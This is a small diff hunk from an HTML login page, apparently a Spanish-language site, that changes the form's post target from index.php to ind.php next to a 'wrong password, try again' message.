@@ -43,7 +43,7 @@
     <td width="790">
   </tr>
   <tr>
-    <td height="642" align="center" ><form id="form1" name="form1" method="post" action="index.php">
+    <td height="642" align="center" ><form id="form1" name="form1" method="post" action="ind.php">
       <p>&nbsp;</p>
       <font color="white">
       <p>Contraseña incorrecta vuelve a intentarlo</p>
